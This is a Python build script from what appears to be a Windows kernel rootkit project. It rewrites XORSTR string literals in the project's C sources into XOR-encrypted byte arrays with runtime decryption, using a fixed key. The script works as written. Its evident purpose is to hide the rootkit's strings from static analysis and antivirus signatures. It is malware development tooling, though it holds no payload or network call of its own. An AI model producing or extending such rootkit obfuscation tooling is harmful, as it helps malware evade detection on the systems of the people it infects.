#!/usr/bin/env python3
"""
================================================================================
rootkit/build/xorstr.py - String Literal Obfuscation Preprocessor
================================================================================

This script implements the "processed" half of the XORSTR obfuscation scheme.

HOW IT WORKS:
  1. Scans all .c files under the given source root
  2. Finds XORSTR("literal") occurrences
  3. Rewrites them as encrypted byte arrays + runtime decrypt calls

BEFORE (source):
    DbgPrint(XORSTR("Hello World"));

AFTER (processed):
    UCHAR _xor_buf[] = {0x1F, 0x32, ...};  // XOR-encrypted bytes
    rk_xorstr_decrypt(_xor_buf, 11, ...);  // Runtime decrypt

The build defines RK_XORSTR_PROCESSED so the same source compiles both
pre- and post-processing.

XOR_KEY must match inc/config.h::XOR_KEY (default 0x5A).
================================================================================
"""
import os
import re
import sys

# Must match inc/config.h::XOR_KEY
KEY = 0x5A

# Matches XORSTR("...") with escaped quotes support
PATTERN = re.compile(r'XORSTR\("((?:[^"\\]|\\.)*)"\)')

def enc(s: str) -> str:
    """Encrypt string with XOR_KEY, return as \xHH escape sequence."""
    out = []
    for ch in s:
        out.append("\\x%02x" % ((ord(ch) ^ KEY) & 0xFF))
    return "".join(out)

def process_file(path: str) -> bool:
    """Process a single .c file. Returns True if modified."""
    with open(path, "r", encoding="utf-8") as f:
        src = f.read()

    if "XORSTR(" not in src:
        return False

    def repl(m):
        literal = m.group(1)
        return 'RK_XORSTR_ENC("%s", %d)' % (enc(literal), len(literal))

    new = PATTERN.sub(repl, src)
    if new == src:
        return False

    with open(path, "w", encoding="utf-8") as f:
        f.write(new)
    return True

def main():
    if len(sys.argv) < 2:
        print("usage: xorstr.py <src-root>")
        return 1

    root = sys.argv[1]
    n = 0

    for dirpath, _, files in os.walk(root):
        for fn in files:
            if fn.endswith(".c"):
                if process_file(os.path.join(dirpath, fn)):
                    n += 1

    print("[xorstr] processed %d files" % n)
    return 0

if __name__ == "__main__":
    sys.exit(main())